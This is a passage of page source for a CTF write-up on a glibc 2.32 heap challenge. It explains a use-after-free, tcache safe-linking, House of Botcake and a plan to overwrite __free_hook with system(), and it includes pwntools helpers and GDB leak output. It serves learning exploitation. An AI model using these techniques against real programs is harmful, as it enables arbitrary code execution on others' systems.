\",(0,n.jsx)(e.code,{children:\"fgets()\"}),\":\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/add_page.png\",alt:\"add_page.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The second option is \",(0,n.jsx)(e.code,{children:\"Show Page\"}),\", which first check if the pointer to chunk is removed or exist in global var \",(0,n.jsx)(e.code,{children:\"note\"}),\". If exist, print data of that chunk out with \",(0,n.jsx)(e.code,{children:\"puts()\"}),\" (\",(0,n.jsx)(e.code,{children:\"puts()\"}),\" will end at null byte).\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/show_page.png\",alt:\"show_page.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"And the last option is \",(0,n.jsx)(e.code,{children:\"Delete Page\"}),\" and we don\\u2019t have any option to edit the chunk. The function first check if the pointer to chunk is exist or not. If exist, free() it without removing the pointer to chunk \\u2192 \",(0,n.jsx)(e.strong,{children:\"Use After Free\"})]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/delete_page.png\",alt:\"delete_page.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"And that\\u2019s all bug we can found. Let\\u2019s move on the next part: Brainstorming!\"}),`\n`,(0,n.jsxs)(e.h2,{id:\"2-brainstorming\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#2-brainstorming\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"2. Brainstorming\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"If you\\u2019re not familiar with heap, please read \",(0,n.jsx)(e.a,{href:\"https://guyinatuxedo.github.io/25-heap/index.html\",children:\"here\"}),\" to have a general view about all kinds of chunk.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"First, we will need to leak the main arena address by freeing a large chunk and make it go to large bin (if goes to unsorted bin, it will have null byte at LSB). When we have the libc address, we will need to do a \",(0,n.jsx)(e.strong,{children:\"Tcache attack\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"So let\\u2019s search for available technique to attack lib 2.32 \",(0,n.jsx)(e.a,{href:\"https://github.com/shellphish/how2heap/blob/master/glibc_2.32\",children:\"here\"}),\" and we can see that there is a technique called \",(0,n.jsx)(e.a,{href:\"https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c\",children:\"House of botcake\"}),\" will help us double free and overlap chunk. With this, we can overwrite the forward pointer to any address we want.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"One thing to notice is that on libc 2.32, the \",(0,n.jsx)(e.a,{href:\"https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L2928\",children:\"tcache\"}),\" changed its act with a simple XOR was added to it:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`/* Caller must ensure that we know tc_idx is valid and there\\u2019s room\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`   for more chunks.  */\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`static __always_inline void\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`tcache_put (mchunkptr chunk, size_t tc_idx)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`{\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`     detect a double free.  */\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  e-\u003ekey = tcache;\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  e-\u003enext = PROTECT_PTR (\u0026e-\u003enext, tcache-\u003eentries[tc_idx]);\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  tcache-\u003eentries[tc_idx] = e;\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  ++(tcache-\u003ecounts[tc_idx]);\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`}\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`/* Caller must ensure that we know tc_idx is valid and there\\u2019s\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`   available chunks to remove.  */\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`static __always_inline void *\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`tcache_get (size_t tc_idx)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`{\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  tcache_entry *e = tcache-\u003eentries[tc_idx];\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  if (__glibc_unlikely (!aligned_OK (e)))\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  tcache-\u003eentries[tc_idx] = REVEAL_PTR (e-\u003enext);\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  --(tcache-\u003ecounts[tc_idx]);\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  e-\u003ekey = NULL;\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  return (void *) e;\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`}\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Two new macros are added to protect the chunk when storing and fetching a chunk which is linked to an old chunk in tcache (which means when we free a chunk and it goes to tcache, the forward pointer will be XOR first and then write to that chunk).\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"At line 12 and 25, there is a function called \",(0,n.jsx)(e.code,{children:\"PROTECT_PTR\"}),\" and \",(0,n.jsx)(e.code,{children:\"REVEAL_PTR\"}),\" which is new in libc 2.32. These functions are defined in the \",(0,n.jsx)(e.a,{href:\"https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L341\",children:\"source\"}),\" as follows:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"PROTECT_PTR\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"__typeof\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"REVEAL_PTR\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"PROTECT_PTR\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"For example with the image below, \",(0,n.jsx)(e.code,{children:\"P\"}),\" is previous address of old freed chunk, \",(0,n.jsx)(e.code,{children:\"L\"}),\" is current chunk being freed, the protected forward pointer can be calculate as:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/ex_protect_ptr.png\",alt:\"ex_protect_ptr.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can also create a script to \",(0,n.jsx)(e.code,{children:\"malloc()\"}),\" and then \",(0,n.jsx)(e.code,{children:\"free()\"}),\" to make it go to tcache and we check that. The address for the first chunk is \",(0,n.jsx)(e.code,{children:\"0x55555555b2a0\"}),\" (don\\u2019t include heap metadata):\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/prev_chunk_ex.png\",alt:\"prev_chunk_ex.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"So when it\\u2019s freed, the protected forward pointer for this chunk can be calculate as follows:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`# (\u003cCurrent chunk address\u003e \u003e\u003e 12) ^ \u003cPrevious chunk address\u003e = \u003cprotected forward pointer\u003e\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  (     0x55555555b2a0     \u003e\u003e 12) ^             0            = 0x55555555b\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Because this is the first chunk being freed and go to tcache first so \",(0,n.jsx)(e.code,{children:\"\u003cPrevious chunk address\u003e\"}),\" will equal to 0. And we will have the address for the second chunk is \",(0,n.jsx)(e.code,{children:\"0x55555555c2e0\"}),\" (don\\u2019t include heap metadata):\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/current_chunk_ex.png\",alt:\"current_chunk_ex.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"So the protected forward pointer will equal to:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`# (\u003cCurrent chunk address\u003e \u003e\u003e 12) ^ \u003cPrevious chunk address\u003e = \u003cprotected forward pointer\u003e\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  (     0x55555555c2e0     \u003e\u003e 12) ^      0x55555555b2a0      = 0x55500000e7fc\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"So to overwrite forward pointer, we need the address of previous chunk. That\\u2019s the point we need to notice here.\"}),`\n`,(0,n.jsxs)(e.h3,{id:\"reference-sources\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#reference-sources\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Reference sources\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4\",children:\"https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"http://blog.nsfocus.net/glibc-234/\",children:\"http://blog.nsfocus.net/glibc-234/\"})}),`\n`]}),`\n`,(0,n.jsxs)(e.h3,{id:\"summary\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#summary\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Summary:\"]}),`\n`,(0,n.jsxs)(e.ol,{children:[`\n`,(0,n.jsx)(e.li,{children:\"Leak main arena address\"}),`\n`,(0,n.jsx)(e.li,{children:\"Leak heap address\"}),`\n`,(0,n.jsx)(e.li,{children:\"Overwrite forward pointer\"}),`\n`,(0,n.jsxs)(e.li,{children:[\"Overwrite \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" with system()\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.h2,{id:\"3-exploit\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#3-exploit\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"3. Exploit\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Before we exploit, I wrote these function for a convenient exploitation:\"}),`\n`,(0,n.jsxs)(\"details\",{children:[(0,n.jsx)(\"summary\",{children:\"Code snippet\"}),(0,n.jsx)(\"p\",{children:(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'\u003e\u003e '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'1'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'size : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'Name : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"show\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'\u003e\u003e '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'2'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvuntil\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\n'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" drop\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"free\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'\u003e\u003e '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'3'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})})})]}),`\n`,(0,n.jsx)(e.p,{children:\"And now let\\u2019s start!\"}),`\n`,(0,n.jsxs)(e.h3,{id:\"stage-1-leak-main-arena-address\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-1-leak-main-arena-address\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Stage 1: Leak main arena address\"]}),`\n`,(0,n.jsx)(e.p,{children:\"First, we will create a large chunk and then free it to make it go to unsorted bin:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`add(0, 0x1000, '{}'.format(0).encode()*8)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`add(1, 0x10, '{}'.format(1).encode()*8)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`free(0)\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Check in GDB and we can see that the main arena address contains null byte at LSB:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/unsortedbin_null_byte.png\",alt:\"unsortedbin_null_byte.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"And we know that \",(0,n.jsx)(e.code,{children:\"puts()\"}),\" will stop at null byte, so we cannot print that address out. We will try to put it into the large bin to see if it\\u2019s different:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"And check again, we see that there is no null byte in the address anymore:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/large_bin_not_null_byte.png\",alt:\"large_bin_not_null_byte.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"And below the libc main arena address is the heap forward and backward pointer but we won\\u2019t use this chunk to leak that heap address. Just libc is enough.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"So we just leak the libc address out with the bug \",(0,n.jsx)(e.strong,{children:\"Use After Free\"}),\", then calculate the offset and take the leaked address subtract with offset, we will get the libc base address:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  x/10xg 0x1b882a0-0x10\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1b88290:  0x0000000000000000  0x0000000000001011\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1b882a0:  0x00007f4a4b3d9220  0x00007f4a4b3d9220\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1b882b0:  0x0000000001b88290  0x0000000001b88290\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1b882c0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1b882d0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  vmmap\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`[ Legend:  Code | Heap | Stack ]\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`Start              End                Offset             Perm Path\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`...\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x0000000000404000 0x0000000000405000 0x0000000000004000 rw- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/dnote_patched\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x0000000001b88000 0x0000000001ba9000 0x0000000000000000 rw- [heap]\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x00007f4a4b212000 0x00007f4a4b214000 0x0000000000000000 rw-\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x00007f4a4b214000 0x00007f4a4b23a000 0x0000000000000000 r-- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x00007f4a4b23a000 0x00007f4a4b388000 0x0000000000026000 r-x /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`...\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  p/x 0x00007f4a4b3d9220 - 0x00007f4a4b214000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`$1 = 0x1c5220\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So offset is \",(0,n.jsx)(e.code,{children:\"0x1c5220\"}),\". The following code will be use to take this leak and calculate libc base address:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token 